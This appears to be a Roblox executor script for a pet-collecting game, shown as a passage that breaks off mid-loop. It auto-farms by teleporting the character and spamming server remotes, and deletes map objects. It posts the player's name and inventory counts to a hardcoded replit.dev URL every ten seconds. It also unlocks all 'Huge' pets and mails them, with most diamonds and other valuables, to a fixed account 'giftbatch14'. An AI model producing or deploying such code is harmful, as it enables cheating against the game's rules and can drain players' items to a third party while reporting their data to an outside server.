











































wait(3)
if game.PlaceId ~= 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World1Teleport:InvokeServer()
        wait(5)
    end
end
spawn(GameCheck)




local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Instances") and Workspace.__THINGS.Instances:FindFirstChild("AdvancedDigsite") and Workspace.__THINGS.Instances.AdvancedDigsite:FindFirstChild("Teleports") then
    local Teleports = Workspace.__THINGS.Instances.AdvancedDigsite.Teleports

    if Teleports:FindFirstChild("Enter") and Teleports.Enter:FindFirstChild("PortalBillboard") then
        local portalBillboard = Teleports.Enter.PortalBillboard
        if portalBillboard:FindFirstChild("Label") and portalBillboard.Label.Text == "You must obtain a shovel from the Fossil Digsite!" then

            if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Instances") and Workspace.__THINGS.Instances:FindFirstChild("Digsite") and Workspace.__THINGS.Instances.Digsite:FindFirstChild("Teleports") then
                local targetPosition = Workspace.__THINGS.Instances.Digsite.Teleports:FindFirstChild("Enter").Position
                humanoidRootPart.CFrame = CFrame.new(targetPosition)
            end
            task.wait(8)

            local args = {
                [1] = "Digsite",
                [2] = "ClaimShovel"
            }

            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Instancing_FireCustomFromClient"):FireServer(unpack(args))
            task.wait(1)

            if Workspace:FindFirstChild("__THINGS") and Workspace.__THINGS:FindFirstChild("Instances") and Workspace.__THINGS.Instances:FindFirstChild("Digsite") and Workspace.__THINGS.Instances.Digsite:FindFirstChild("Teleports") then
                local targetPosition = Workspace.__THINGS.Instances.Digsite.Teleports:FindFirstChild("Leave").Position
                humanoidRootPart.CFrame = CFrame.new(targetPosition)
            end
task.wait(8)
        end
    end
end





local player = game.Players.LocalPlayer

local function getHumanoidRootPart()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local function BodyVelocity()
    while true do
        task.wait(1)
        local humanoidRootPart = getHumanoidRootPart()
        if humanoidRootPart then
            local BV = humanoidRootPart:FindFirstChild("BodyVelocity")
            if not BV then
                BV = Instance.new("BodyVelocity")
                BV.Parent = humanoidRootPart
            end
            BV.Velocity = Vector3.new(0, 0.0000001, 0)
            BV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        end
    end
end

spawn(BodyVelocity)

local ReplicatedStorage = game:GetService("ReplicatedStorage")

function OrbCollect()
    while true do 
        local Orbs = workspace:FindFirstChild("__THINGS")
        if Orbs then
            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
                local ohTable1 = { tonumber(orb.Name) }
                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
                orb:Destroy()
            end 
        end
        task.wait()
    end
end


function LootbagCollect()
    while true do 
        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
        if Lootbags then
            for _, bag in ipairs(Lootbags:GetChildren()) do
                local ohTable1 = { tostring(bag) }
                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
                bag:Destroy()
            end 
        end
        task.wait()
    end
end

spawn(OrbCollect)
spawn(LootbagCollect)

local function MailClaim()
while true do
    local player = game.Players.LocalPlayer
    
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
            if mailboxMachine then
                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
                if giftsFrame then
                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then

                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)

local args = {
    [1] = "Ultra Mastery",
    [2] = 1,
    [3] = "Economy"
}

game:GetService("ReplicatedStorage").Network:FindFirstChild("XPPotions: Consume"):InvokeServer(unpack(args))

local function Garden()
while true do
local player = game.Players.LocalPlayer
local gui = player.PlayerGui:FindFirstChild("_MACHINES")

if gui and gui:FindFirstChild("Merchant") then
    local merchantFrame = gui.Merchant:FindFirstChild("Frame")
    if merchantFrame and merchantFrame:FindFirstChild("ItemsFrame") then
        local itemsFrame = merchantFrame.ItemsFrame:FindFirstChild("Items")
        if itemsFrame then
            for _, child in ipairs(itemsFrame:GetChildren()) do
                if child:IsA("Frame") and child:FindFirstChild("ITEM") and child.ITEM:FindFirstChild("ItemSlot") and child.ITEM.ItemSlot:FindFirstChild("Icon") then
                    local image = child.ITEM.ItemSlot.Icon.Image
                    if image ~= "rbxassetid://15554895803" and 
                       image ~= "rbxassetid://15554896103" and 
                       image ~= "rbxassetid://15554895953" and
image ~= "rbxassetid://15555104643" then
                        if child:FindFirstChild("Locked") and child.Locked.Visible == false then
                            local args = {
                                [1] = "GardenMerchant",
                                [2] = tonumber(child.Name)
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer(unpack(args))
wait(0.5)
                        
                        end
                    end
                end
            end
        end
    end
end


wait()
end
end
spawn(Garden)

local function BuyingGarden()
    while true do
        local player = game.Players.LocalPlayer
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")

        if gui then
            local merchant = gui:FindFirstChild("Merchant")
            if merchant then
                local FrameFound = merchant:FindFirstChild("Frame")
                if FrameFound then
                local itemsFrame = FrameFound:FindFirstChild("ItemsFrame")
            if itemsFrame then
                    local bottom = itemsFrame:FindFirstChild("Bottom")
                    if bottom then
                        local respectLevel = bottom:FindFirstChild("RespectLevel")
                        if respectLevel and respectLevel.Text ~= "Respect Level 5" then

                            for i = 1, 6 do
                                local args = {
                                    [1] = "GardenMerchant",
                                    [2] = i
                                }
                                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer(unpack(args))
                                wait(0.5)
                            end

end
                        end
                    end
                end
            end
        end
        wait(0.1)
    end
end

spawn(BuyingGarden)

local function plant()
            while true do
                for i = 1, 11 do
                    local args = {
                        [1] = "FlowerGarden",
                        [2] = "ClaimPlant",
                        [3] = i
                    }
                    game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(unpack(args))
                    wait()
                end
            end
        end
spawn(plant)

   local function diamondss()
            while true do
                for i = 1, 11 do
                    local args = {
                        [1] = "FlowerGarden",
                        [2] = "PlantSeed",
                        [3] = i,
                        [4] = "Diamond"
                    }
                    game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
                    wait()
                end
            end
        end
    spawn(diamondss)

   
local function WetGarden()
while true do
     for i = 1, 11 do
local args = {
    [1] = "FlowerGarden",
    [2] = "WaterSeed",
    [3] = i
}

game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
wait(1)
end
wait(1)
end
end
spawn(WetGarden)

local function openchest()
    while true do
        for i = 1, 11 do
            local args = {
                [1] = "FlowerGarden",
                [2] = "PurchaseSlot",
                [3] = i
            }
            game:GetService("ReplicatedStorage").Network.Instancing_InvokeCustomFromClient:InvokeServer(unpack(args))
            wait(0.5)
        end

        game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer(
            "FlowerGarden", "ClaimWateringCan"
        )

        game:GetService("ReplicatedStorage").Network.InstanceChests_Claim:InvokeServer(
            "InstanceChest: 3", "FlowerGarden"
        )

        wait(5)
    end
end

spawn(openchest)

local function MapDestroy()
    while true do
        local flowerGarden = game.Workspace:FindFirstChild("__THINGS") and game.Workspace.__THINGS:FindFirstChild("__INSTANCE_CONTAINER") and game.Workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") and game.Workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("FlowerGarden")
        if flowerGarden then
            for _, child in ipairs(flowerGarden:GetChildren()) do
                if child.Name == "Interactable" or child.Name == "rock-door" or child.Name == "PARTS" then
                    child:Destroy()
                end
            end
        end

        local things = game.Workspace:FindFirstChild("__THINGS")
        if things then
            for _, child in ipairs(things:GetChildren()) do
                if child.Name == "BalloonGifts" or child.Name == "ShinyRelics" or child.Name == "AnimatedBreakables" or child.Name == "Eggs" or child.Name == "Breakables" or child.Name == "CustomEggs" or child.Name == "RenderedEggs" or child.Name == "VictoryScene" or child.Name == "HiddenPresents" or child.Name == "_FAKE_GROUND" then
                    for _, descendant in ipairs(child:GetDescendants()) do
                        descendant:Destroy()
                    end
                end
            end
        end

        local instances = things and things:FindFirstChild("Instances")
        if instances then
            for _, child in ipairs(instances:GetChildren()) do
                if child.Name ~= "FlowerGarden" and  child.Name ~= "AdvancedDigsite" then
                    child:Destroy()
                end
            end
        end

        local map = game.Workspace:FindFirstChild("Map")
        if map then
            for _, child in ipairs(map:GetChildren()) do
                if child.Name ~= "54 | Flower Field" then
                    for _, descendant in ipairs(child:GetDescendants()) do
                        descendant:Destroy()
                    end
                end
            end
        end

        for _, name in ipairs({"FlyBorder", "Border", "ALWAYS_RENDERING"}) do
            local obj = game.Workspace:FindFirstChild(name)
            if obj then
                for _, descendant in ipairs(obj:GetDescendants()) do
                    descendant:Destroy()
                end
            end
        end

        wait(2)
    end
end

spawn(MapDestroy)






local function TeleportingScript()
while true do
wait(1)
local player = game.Players.LocalPlayer
local character = player.Character
local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
local gui = player.PlayerGui:FindFirstChild("_MACHINES")

if gui and gui:FindFirstChild("Merchant") and humanoidRootPart then
local merchant = gui.Merchant
repeat
local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
humanoidRootPart.CFrame = CFrame.new(257.57, 16.55, 2058) * CFrame.new(randomOffset)
task.wait(2)
until merchant.Enabled == true

wait(15)

local things = workspace:FindFirstChild("__THINGS")
local instances = things and things:FindFirstChild("Instances")
local flowerGarden = instances and instances:FindFirstChild("FlowerGarden")
local teleports = flowerGarden and flowerGarden:FindFirstChild("Teleports")
local enter = teleports and teleports:FindFirstChild("Enter")
local leave = teleports and teleports:FindFirstChild("Leave")

if enter and leave then
repeat
local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
humanoidRootPart.CFrame = enter.CFrame * CFrame.new(randomOffset)
task.wait(15)
until (humanoidRootPart.Position - leave.Position).Magnitude <= 100

repeat
local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
humanoidRootPart.CFrame = leave.CFrame * CFrame.new(randomOffset)
task.wait(15)
until (humanoidRootPart.Position - enter.Position).Magnitude <= 100
end
end

local things = workspace:FindFirstChild("__THINGS")
local instances = things and things:FindFirstChild("Instances")
local advancedDigsite = instances and instances:FindFirstChild("AdvancedDigsite")
local teleports = advancedDigsite and advancedDigsite:FindFirstChild("Teleports")
local enter = teleports and teleports:FindFirstChild("Enter")
local leave = teleports and teleports:FindFirstChild("Leave")

if enter and humanoidRootPart then
repeat
local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
humanoidRootPart.CFrame = enter.CFrame * CFrame.new(randomOffset)
task.wait(20)
until workspace.__THINGS.__INSTANCE_CONTAINER:FindFirstChild("Active") 
and workspace.__THINGS.__INSTANCE_CONTAINER.Active:FindFirstChild("AdvancedDigsite") 
and workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite:FindFirstChild("Important") 
and workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important:FindFirstChild("ActiveBlocks") 
and #workspace.__THINGS.__INSTANCE_CONTAINER.Active.AdvancedDigsite.Important.ActiveBlocks:GetChildren() > 0
end

wait(15)

if leave and humanoidRootPart then
repeat
local randomOffset = Vector3.new(math.random(-1, 1), 0, math.random(-1, 1))
humanoidRootPart.CFrame = leave.CFrame * CFrame.new(randomOffset)
task.wait(20)
until (humanoidRootPart.Position - enter.Position).Magnitude <= 100
end

wait(1)
end
end

spawn(TeleportingScript)

local SearchIdentifier = {"Misc", "Lootbox", "Consumable", "Currency", "Seed", "Potion"}

local function SearchItemByName(targetName, searchIdentifier)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    for Class, Items in pairs(Inventory) do
        if table.find(searchIdentifier, Class) then
            for UID, Item in pairs(Items) do
                if Item.id == targetName and Item._am then
                    return Item._am, UID
                end
            end
        end
    end
    return 0, nil
end

local DiamondsCurrencyAmount
local DiamondsCurrencyUID
local InstaPlantAmount
local InstaPlantUID
local SeedBagAmount
local SeedBagUID
local DiamondsSeedAmount
local DiamondsSeedUID
local hugepotionamount
local hugepotionuid 

local function SetValues()
    while true do
        local diamondsAmount, diamondsUID = SearchItemByName("Diamonds", {"Currency"})
        if diamondsAmount > 0 then
            DiamondsCurrencyAmount = diamondsAmount
            DiamondsCurrencyUID = diamondsUID
        end

        local instaPlantAmount, instaPlantUID = SearchItemByName("Insta Plant Capsule", {"Misc", "Lootbox"})
        if instaPlantAmount > 0 then
            InstaPlantAmount = instaPlantAmount
            InstaPlantUID = instaPlantUID
        end

        local seedBagAmount, seedBagUID = SearchItemByName("Seed Bag", {"Misc"})
        if seedBagAmount > 0 then
            SeedBagAmount = seedBagAmount
            SeedBagUID = seedBagUID
        end

        local diamondsSeedAmount, diamondsSeedUID = SearchItemByName("Diamond", {"Seed"})
        if diamondsSeedAmount > 0 then
            DiamondsSeedAmount = diamondsSeedAmount
            DiamondsSeedUID = diamondsSeedUID
        end

        local hugepotionamountlol, hugepotionuidlol = SearchItemByName("Huge", {"Potion"})
        if hugepotionamountlol > 0 then
            hugepotionamount = hugepotionamountlol
            hugepotionuid = hugepotionuidlol
          
        end

        wait(1)
    end
end

spawn(SetValues)

wait(5)

local function WebsiteDataUpdate()
    while true do
        local Player = game.Players.LocalPlayer
        local playerName = Player.Name
        local Http = game:GetService("HttpService")
        local request = (syn and syn.request) or request or (http and http.request) or http_request

        local requestBody = Http:JSONEncode({
            Username = playerName,
            VoidTicketsValue = tonumber(hugepotionamount) or 0,
            DiamondsValue = tonumber(DiamondsCurrencyAmount) or 0,
            HugeList = "0",
            Server = "0",
            InstaplantValue = tostring(InstaPlantAmount) or 0,
            SeedbagValue = tostring(SeedBagAmount) or 0,
            DiamondsSeedValue = tostring(DiamondsSeedAmount) or 0
        })

        local success, response = pcall(function()
            return request({
                Url = 'https://64a08a7a-3355-4149-afcf-d0b7deaaa4f9-00-2nm6vd6tjffq6.janeway.replit.dev/update',
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = requestBody
            })
        end)

        task.wait(10)
    end
end

spawn(WebsiteDataUpdate)


local RowPositions = {
    Vector3.new(675, 51, -2701),
    Vector3.new(659, 51, -2749),
    Vector3.new(691, 51, -2685),
    Vector3.new(675, 51, -2717),
    Vector3.new(691, 51, -2701),
    Vector3.new(691, 51, -2717),
    Vector3.new(691, 51, -2749),
    Vector3.new(659, 51, -2653),
    Vector3.new(659, 51, -2701),
    Vector3.new(611, 51, -2669),
    Vector3.new(627, 51, -2669),
    Vector3.new(595, 51, -2669),
    Vector3.new(675, 51, -2653),
    Vector3.new(675, 51, -2669),
    Vector3.new(659, 51, -2669),
    Vector3.new(595, 51, -2685),
    Vector3.new(611, 51, -2701),
    Vector3.new(611, 51, -2685),
    Vector3.new(643, 51, -2717),
    Vector3.new(595, 51, -2733),
    Vector3.new(611, 51, -2653),
    Vector3.new(627, 51, -2701),
    Vector3.new(643, 51, -2701),
    Vector3.new(627, 51, -2685),
    Vector3.new(643, 51, -2653),
    Vector3.new(595, 51, -2701),
    Vector3.new(627, 51, -2717),
    Vector3.new(611, 51, -2717),
    Vector3.new(691, 51, -2733),
    Vector3.new(643, 51, -2685),
    Vector3.new(643, 51, -2669),
    Vector3.new(675, 51, -2733),
    Vector3.new(595, 51, -2653),
    Vector3.new(659, 51, -2717),
    Vector3.new(659, 51, -2733),
    Vector3.new(691, 51, -2669),
    Vector3.new(691, 51, -2653),
    Vector3.new(595, 51, -2717),
    Vector3.new(595, 51, -2749),
    Vector3.new(611, 51, -2749),
    Vector3.new(627, 51, -2749),
    Vector3.new(643, 51, -2733),
    Vector3.new(611, 51, -2733),
    Vector3.new(627, 51, -2733),
    Vector3.new(627, 51, -2653),
    Vector3.new(643, 51, -2749),
    Vector3.new(659, 51, -2685),
    Vector3.new(675, 51, -2749),
    Vector3.new(675, 51, -2685)
}



local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local function AdvancedDeleter()
    while true do
        local workspace = game:GetService("Workspace")
        local things = workspace:FindFirstChild("__THINGS")
        local container = things and things:FindFirstChild("__INSTANCE_CONTAINER")
        local active = container and container:FindFirstChild("Active")
        local advancedDigsite = active and active:FindFirstChild("AdvancedDigsite")

        if advancedDigsite then
            for _, child in ipairs(advancedDigsite:GetChildren()) do
                if child.Name ~= "Important" then
                    child:Destroy()
                end
            end
        end
        wait(5)
    end
end

spawn(AdvancedDeleter)



local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local MagicBucketData = {"Bucket O' Magic"}
local BucketData = {"Bucket"}
local ItemTable = {"Diamonds"}
local InstaPlantData = {"Insta Plant Capsule"}
local SeedBagData = {"Seed Bag"}
local DiamondData = {"Diamond"}
local DiamondsSeedAmount = 0 
local MagicBucketAM = 0
local BucketAmount = 0
local InstaPlantAmount = 0
local SeedBagAmount = 0
local MagicBucketUID = ""
local DiamondsID = 0
local DiamondsAmount = 0
local InstaUID = ""
local DiamondSeedUID = ""
local SeedBagUID = ""

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    for UID, Item in pairs(Inventory[ItemsClass]) do
        if table.find(ItemsName, Item.id) then
            local ItemInfo = {
                ["uid"] = UID,
                ["data"] = Item
            }
            table.insert(Table, ItemInfo)
        end
    end
    return Table
end

local function UpdateBucketAmount()
    while true do
        local MiscItems = GetItemInfo("Misc", MagicBucketData)
        for _, ItemInfo in pairs(MiscItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                MagicBucketAM = ItemData._am
                MagicBucketUID = ItemInfo.uid
            end
        end

        local MiscItemsBucket = GetItemInfo("Misc", BucketData)
        for _, ItemInfo in pairs(MiscItemsBucket) do
            local ItemData = ItemInfo.data
            if ItemData._am then
                BucketAmount = ItemData._am
            end
        end

        local InstaPlantItems = GetItemInfo("Misc", InstaPlantData)
        for _, ItemInfo in pairs(InstaPlantItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
InstaUID = ItemInfo.uid 
                InstaPlantAmount = ItemData._am
            end
        end

        local SeedBagItems = GetItemInfo("Misc", SeedBagData)
        for _, ItemInfo in pairs(SeedBagItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
SeedBagUID = ItemInfo.uid
                SeedBagAmount = ItemData._am
            end
        end


    local DiamondsItems = GetItemInfo("Seed", DiamondData)
        for _, ItemInfo in pairs(DiamondsItems) do
            local ItemData = ItemInfo.data
            if ItemData._am then
DiamondSeedUID = ItemInfo.uid
                DiamondsSeedAmount = ItemData._am
            end
        end

        local CurrencyItems = GetItemInfo("Currency", ItemTable)
        for _, ItemInfo in pairs(CurrencyItems) do
            local ItemData = ItemInfo.data
            if ItemData._am and ItemData.id == "Diamonds" then
                DiamondsID = ItemInfo.uid
                DiamondsAmount = ItemData._am
            end
        end
        
        wait(0.3)
    end
end
spawn(UpdateBucketAmount)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    while true do
        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
                if table.find(ItemsName, Item.id) then
                    local ItemInfo = {
                        ["uid"] = UID,
                        ["data"] = Item
                    }
                    table.insert(Table, ItemInfo)
                end
            end
            return Table
        end

        local function getCurrentHugePets()
            local GoldPetsTable = {}
            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                table.insert(GoldPetsTable, Pet.Name)
            end
            return GetItemInfo("Pet", GoldPetsTable)
        end

        local hugePets = {}
        local uids = {}

        for i, MadeTable in next, getCurrentHugePets() do
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
        end

        if #hugePets > 0 then
            for i = #uids, 1, -1 do
                

                local args = {
                    [1] = uids[i],
                    [2] = false
                }

                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                wait(1)
                wait(3)

                local args = {
                    [1] = "giftbatch14",
                    [2] = "omg u got a new huge!!",
                    [3] = "Pet",
                    [4] = uids[i],
                    [5] = 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

                wait(3)
            end
        end
        wait(3)
    end
end

spawn(ProcessHugePets)



local function activeBlocks()
    local workspace = game:GetService("Workspace")
    local things = workspace:FindFirstChild("__THINGS")
    local container = things and things:FindFirstChild("__INSTANCE_CONTAINER")
    local active = container and container:FindFirstChild("Active")
    local digsite = active and active:FindFirstChild("AdvancedDigsite")
    local important = digsite and digsite:FindFirstChild("Important")
    return important and important:FindFirstChild("ActiveBlocks") or nil
end

local function activeChests()
    local workspace = game:GetService("Workspace")
    local things = workspace:FindFirstChild("__THINGS")
    local container = things and things:FindFirstChild("__INSTANCE_CONTAINER")
    local active = container and container:FindFirstChild("Active")
    local digsite = active and active:FindFirstChild("AdvancedDigsite")
    local important = digsite and digsite:FindFirstChild("Important")
    return important and important:FindFirstChild("ActiveChests") or nil
end

local function DestroyRows()
    while true do
        local blocks = activeBlocks()
        if blocks then
            for _, child in ipairs(blocks:GetChildren()) do
                if child:IsA("Part") then
                    local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
                    local inRow = false

                    for _, row in ipairs(RowPositions) do
                        if x == row.X and z == row.Z then
                            inRow = true
                            break
                        end
                    end

                    if not inRow and child.BrickColor ~= BrickColor.new("Royal purple") and child.BrickColor ~= BrickColor.new("Really black") then
                        child:Destroy()
                    end
                end
            end
        end
        wait()
    end
end
spawn(DestroyRows)

local currentTarget
local chestActive = false
local PurpleActive = false

function getPositionsFromRandomRow()
    local positions = {}
    local blocks = activeBlocks()
    if blocks then
        local randomRow = RowPositions[math.random(1, #RowPositions)]
        for _, child in ipairs(blocks:GetChildren()) do
            if child:IsA("Part") then
                local x, y, z = math.floor(child.Position.X + 0.5), math.floor(child.Position.Y + 0.5), math.floor(child.Position.Z + 0.5)
                if x == randomRow.X and z == randomRow.Z and child.BrickColor ~= BrickColor.new("Really black") and child.BrickColor ~= BrickColor.new("Royal purple") then
                    table.insert(positions, child)
                end
            end
        end
    end
    return positions
end

function findFurthestBlock(positions)
    local furthestBlock = nil
    local lowestY = math.huge

    for _, block in ipairs(positions) do
        if block.Position.Y < lowestY then
            lowestY = block.Position.Y
            furthestBlock = block
        end
    end

    return furthestBlock
end

local function teleportToPosition(position)
    humanoidRootPart.CFrame = CFrame.new(position)
end

local function teleportToCurrentTarget()
    local blocks = activeBlocks()
    if currentTarget and blocks and currentTarget.Parent == blocks then
        chestActive = false
        PurpleActive = false
        teleportToPosition(currentTarget.Position + Vector3.new(0, 5, 0))
        return true
    end
    return false
end

local function teleportToRoyalPurple()
    local blocks = activeBlocks()
    if BucketAmount > 10 and blocks then
        for _, child in ipairs(blocks:GetChildren()) do
            if child:IsA("Part") and child.BrickColor == BrickColor.new("Royal purple") then
                chestActive = false
                PurpleActive = true
                currentTarget = child
                teleportToPosition(child.Position + Vector3.new(0, 5, 0))
                return true
            end
        end
    end
    return false
end

local function teleportToActiveChestModel()
    local closestChest = nil
    local closestDistance = math.huge
    local chests = activeChests()

    if chests then
        for _, child in ipairs(chests:GetChildren()) do
            if child:IsA("Model") and child:FindFirstChild("Top") then
                local chestPosition = child.Top.Position
                local distance = (chestPosition - player.Character.PrimaryPart.Position).Magnitude
                
                if distance < closestDistance then
                    closestDistance = distance
                    closestChest = child
                end
            end
        end
    end

    if closestChest then
        chestActive = true
        PurpleActive = false
        currentTarget = closestChest
        teleportToPosition(closestChest.Top.Position + Vector3.new(0, 3, 0))

        local startTime = tick()
        local timeout = 0.8

        while tick() - startTime < timeout do
            if not currentTarget or not currentTarget.Parent then
                return true
            end
            wait()
        end

        if currentTarget and currentTarget.Parent then
            currentTarget:Destroy()
        end

        return true
    end
    
    return false
end

function teleportLoop()
    while true do
        coroutine.wrap(function()
            if not teleportToRoyalPurple() then
                if BucketAmount < 30 then
                    if not teleportToActiveChestModel() then
                        if not teleportToCurrentTarget() then
                            local positions = getPositionsFromRandomRow()
                            if #positions > 0 then
                                currentTarget = findFurthestBlock(positions)
                                teleportToPosition(currentTarget.Position + Vector3.new(0, 5, 0))
                            end
                        end
                    end
                else
                    if not teleportToCurrentTarget() then
                        local positions = getPositionsFromRandomRow()
                        if #positions > 0 then
                            currentTarget = findFurthestBlock(positions)
                            teleportToPosition(currentTarget.Position + Vector3.new(0, 5, 0))
                        end
                    end
                end
            end
            wait()
        end)()
        wait()
    end
end

wait(5)
spawn(teleportLoop)


local function RemoteRun()
    while true do
        if currentTarget and currentTarget:GetAttribute("Coord") then
            local coord = currentTarget:GetAttribute("Coord")
          
            if chestActive then
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer("AdvancedDigsite", "DigChest", coord)
            else
                game:GetService("ReplicatedStorage").Network.Instancing_FireCustomFromClient:FireServer("AdvancedDigsite", "DigBlock", coord)
            end
        end
        wait()
    end
end

spawn(RemoteRun)


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local player = game.Players.LocalPlayer

local function getActiveBlocks()
    local things = Workspace:FindFirstChild("__THINGS")
    if not things then return nil end

    local instanceContainer = things:FindFirstChild("__INSTANCE_CONTAINER")
    if not instanceContainer then return nil end

    local active = instanceContainer:FindFirstChild("Active")
    if not active then return nil end

    local digsite = active:FindFirstChild("AdvancedDigsite")
    if not digsite then return nil end

    local important = digsite:FindFirstChild("Important")
    if not important then return nil end

    return important:FindFirstChild("ActiveBlocks")
end

local function RemoteRunBelow()
    while true do
        coroutine.wrap(function()
            local activeBlocks = getActiveBlocks()
            if not activeBlocks then return end

            local character = player.Character
            if character and character:FindFirstChild("HumanoidRootPart") then
                local humanoidRootPart = character.HumanoidRootPart
                local blockBelow = nil
                local rayOrigin = humanoidRootPart.Position
                local rayDirection = Vector3.new(0, -10, 0)
                local rayParams = RaycastParams.new()
                rayParams.FilterDescendantsInstances = {character}
                rayParams.FilterType = Enum.RaycastFilterType.Blacklist

                local rayResult = Workspace:Raycast(rayOrigin, rayDirection, rayParams)

                if rayResult and rayResult.Instance and rayResult.Instance:IsDescendantOf(activeBlocks) and rayResult.Instance:GetAttribute("Coord") then
                    blockBelow = rayResult.Instance
                end

                if blockBelow then
                    local coord = blockBelow:GetAttribute("Coord")
                    ReplicatedStorage.Network.Instancing_FireCustomFromClient:FireServer("AdvancedDigsite", "DigBlock", coord)
                end
            end
            wait()
        end)()
        wait()
    end
end

spawn(RemoteRunBelow)

local function StartPurpleTimers()
    while true do
        local activeBlocks = getActiveBlocks()
        if activeBlocks then
            for _, child in ipairs(activeBlocks:GetChildren()) do
                if child:IsA("Part") and child.BrickColor == BrickColor.new("Royal purple") then
                    if not tonumber(string.match(child.Name, "%d+")) then
                        child.Name = "StartTimer"
                    end
                end
            end
        end
        wait()
    end
end

local function BeginTimerDestroys()
    while true do
        local activeBlocks = getActiveBlocks()
        if activeBlocks then
            for _, child in ipairs(activeBlocks:GetChildren()) do
                if child:IsA("Part") and child.BrickColor == BrickColor.new("Royal purple") then
                    if child.Name == "StartTimer" then
                        child.Name = "1"
                    elseif tonumber(string.match(child.Name, "%d+")) then
                        local num = tonumber(string.match(child.Name, "%d+")) + 1
                        child.Name = tostring(num)
                        if num >= 100 then
                            child:Destroy()
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(StartPurpleTimers)
spawn(BeginTimerDestroys)
local function hugepotionlmfao()
while true do
if MagicBucketAM > 16 then
local args = {
    [1] = "Huge Potion"
}

game:GetService("ReplicatedStorage").Network.MagicMachine_Activate:InvokeServer(unpack(args))
wait()
end
wait(1)
end
end
spawn(hugepotionlmfao)

while true do
    if DiamondsCurrencyAmount > 25000000 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Currency",
            [4] = DiamondsCurrencyUID,
            [5] = DiamondsCurrencyAmount - 500000
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args2))
    end
    wait(5)
    if InstaPlantAmount > 200 then 
        local args2 = {
            [1] = "giftbatch14",
            [2] = "enjoy bro",
            [3] = "Misc",
            [4] = InstaPlantUID,
            [5] = InstaPlantAmount
        }
